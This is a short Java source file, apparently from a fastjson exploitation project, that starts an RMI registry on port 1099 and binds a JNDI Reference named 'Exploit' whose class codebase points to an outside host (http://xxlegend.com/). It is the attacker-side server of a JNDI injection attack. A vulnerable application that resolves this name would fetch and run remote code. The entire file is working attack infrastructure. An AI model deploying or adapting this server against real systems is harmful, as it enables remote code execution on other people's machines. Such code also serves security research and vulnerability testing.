package mypro.myfastjson;

import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;


public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
      //http://xxlegend.com/Exploit.class
      Reference reference = new javax.naming.Reference("Exploit","Exploit","http://xxlegend.com/");
      //Reference reference = new javax.naming.Reference("Exploit","Exploit","http://localhost/");
      ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
      registry.bind("Exploit", referenceWrapper);
    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
